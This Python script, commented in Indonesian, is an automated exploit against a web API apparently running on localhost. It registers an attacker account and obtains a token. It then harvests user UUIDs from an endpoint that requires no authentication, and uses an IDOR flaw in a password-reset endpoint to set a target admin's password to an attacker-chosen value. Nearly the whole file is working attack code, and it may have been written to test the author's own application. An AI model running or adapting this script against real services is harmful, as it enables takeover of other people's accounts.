import requests
import json
import uuid # Untuk membuat data acak

# =======================================================
#               ⚠️ KONFIGURASI SERANGAN ⚠️
# =======================================================
BASE_URL = "http://localhost:3001/api/"

# --- KREDENSIAL PENYERANG (AKAN DIDAFTARKAN) ---
# Gunakan UUID acak agar username dan email selalu unik
RANDOM_ID = str(uuid.uuid4())[:8] 
ATTACKER_USERNAME = f"script_user_{RANDOM_ID}"
ATTACKER_EMAIL = f"script_{RANDOM_ID}@attacker.com"
ATTACKER_PASSWORD = "script_safe_password_123"

# --- TARGET & PASSWORD BARU ---
# Username Korban yang ingin diambil alih (misalnya akun admin yang sudah ada di DB)
TARGET_USERNAME = "admin_korban" 
NEW_PASSWORD = "password_pwned_auto_script" 
# =======================================================


def register_attacker(username, email, password):
    """Langkah 0: Mendaftarkan akun penyerang."""
    print(f"[*] Mencoba mendaftarkan akun: {username}...")
    url = BASE_URL + "auth/register"
    payload = {
        "username": username,
        "email": email,
        "password": password
    }
    
    try:
        response = requests.post(url, json=payload)
        response.raise_for_status()
        print("✅ Registrasi Berhasil.")
        return True
    except requests.exceptions.HTTPError as e:
        if response.status_code == 409:
             print("⚠️ Registrasi Gagal: User sudah ada. Akan mencoba login.")
             return True # Lanjutkan ke login
        print(f"❌ Registrasi Gagal. Error: {e}")
        return False
    except requests.exceptions.RequestException as e:
        print(f"❌ Koneksi Gagal saat Register. Error: {e}")
        return False


def login_attacker(username, password):
    """Langkah 1: Login dan mendapatkan Token Penyerang."""
    print(f"[*] Mencoba login sebagai: {username}...")
    url = BASE_URL + "auth/login"
    payload = {"username": username, "password": password}
    
    try:
        response = requests.post(url, json=payload)
        response.raise_for_status()
        data = response.json()
        print("✅ Login Berhasil.")
        return data.get('token')
    except requests.exceptions.RequestException as e:
        print(f"❌ Login Gagal. Pastikan kredensial benar. Error: {e}")
        return None

def find_target_uuid(target_username):
    """Langkah 2: Eksploitasi No API Auth untuk mendapatkan UUID Korban."""
    print(f"\n[*] Mencari UUID untuk korban: {target_username} (via Data Leak)...")
    url = BASE_URL + "users/all"
    
    try:
        # ⚠️ VULNERABILITY 1: Akses endpoint tanpa token (No API Auth)
        response = requests.get(url)
        response.raise_for_status()
        users = response.json()
        
        for user in users:
            if user.get('username') == target_username:
                uuid_korban = user.get('id')
                print(f"✅ UUID Korban ditemukan: {uuid_korban[:8]}...")
                return uuid_korban
        
        print(f"❌ UUID Korban tidak ditemukan di laporan pengguna.")
        return None
    except requests.exceptions.RequestException as e:
        print(f"❌ Data Leak Gagal. Pastikan backend berjalan di Port 3001. Error: {e}")
        return None

def execute_idor_attack(target_uuid, attacker_token, new_password):
    """Langkah 3: Eksploitasi IDOR untuk mengganti password Korban."""
    print(f"\n[*] Melakukan serangan IDOR untuk mengubah password...")
    # ⚠️ VULNERABILITY 2: URL ditujukan ke ID korban, tetapi menggunakan token penyerang
    url = BASE_URL + f"users/{target_uuid}/reset_password"
    
    headers = {
        "Authorization": f"Bearer {attacker_token}",
        "Content-Type": "application/json"
    }
    payload = {"new_password": new_password}
    
    try:
        response = requests.post(url, headers=headers, json=payload)
        response.raise_for_status()
        
        print(f"✅ IDOR Sukses! Password korban berhasil diubah menjadi: {new_password}")
        print("[DEBUG]: ", response.json().get('message'))
        return True
    except requests.exceptions.HTTPError as e:
        print(f"❌ Serangan IDOR Gagal (HTTP Error {response.status_code}).")
        print("[DEBUG]: ", response.json().get('error'))
        return False
    except requests.exceptions.RequestException as e:
        print(f"❌ Serangan Gagal. Error: {e}")
        return False

# =======================================================
#                      ALUR UTAMA
# =======================================================
if __name__ == "__main__":
    
    print("--- AUTOMATED IDOR EXPLOIT STARTING ---")

    # 0. Register Akun Penyerang
    if not register_attacker(ATTACKER_USERNAME, ATTACKER_EMAIL, ATTACKER_PASSWORD):
        print("\n[FINISH] Eksploitasi dibatalkan setelah gagal register.")
        exit()

    # 1. Login Akun Penyerang
    attacker_token = login_attacker(ATTACKER_USERNAME, ATTACKER_PASSWORD)
    if not attacker_token:
        print("\n[FINISH] Eksploitasi dibatalkan karena gagal login.")
        exit()

    # 2. Cari UUID Korban
    target_uuid = find_target_uuid(TARGET_USERNAME)
    
    if target_uuid:
        # 3. Eksekusi Serangan IDOR
        execute_idor_attack(target_uuid, attacker_token, NEW_PASSWORD)
    else:
        print("\n[FINISH] Eksploitasi dibatalkan karena UUID korban tidak ditemukan.")
    
    print("\n--- AUTOMATED IDOR EXPLOIT FINISHED ---")